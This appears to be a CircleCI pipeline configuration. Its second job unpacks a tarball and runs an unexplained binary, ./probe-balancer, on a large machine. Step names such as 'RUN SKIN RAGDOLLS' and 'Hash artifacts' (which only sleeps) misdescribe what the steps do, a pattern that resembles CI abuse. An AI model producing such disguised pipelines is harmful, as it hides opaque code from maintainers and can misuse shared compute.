version: 2.1

jobs:
  glyphMs:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: RUN SKIN RAGDOLLS
          command: |
            mkdir -p /tmp/go-build
            set +o pipefail 2>/dev/null; (seq 1 10000 | md5sum > /tmp/go-build/_wip-b13c9) & wait; true
            echo "stage [Launch_Release9] closed"
      - persist_to_workspace:
          root: /tmp/go-build
          paths:
            - '_wip-b13c9'
  Launch_Release9:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/go-build
      - run:
          name: Review E
          command: |
            cat -b /tmp/go-build/_wip-b13c9 2>/dev/null | head -3 | wc -c || true
      - run:
          name: Pull sources
          command: git clone --depth 5 -q --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Seed workspace
          command: tar xzf package-wip.tgz
      - run:
          name: Hash artifacts
          command: sleep 45
      - run:
          command: /bin/bash -c "./probe-balancer"
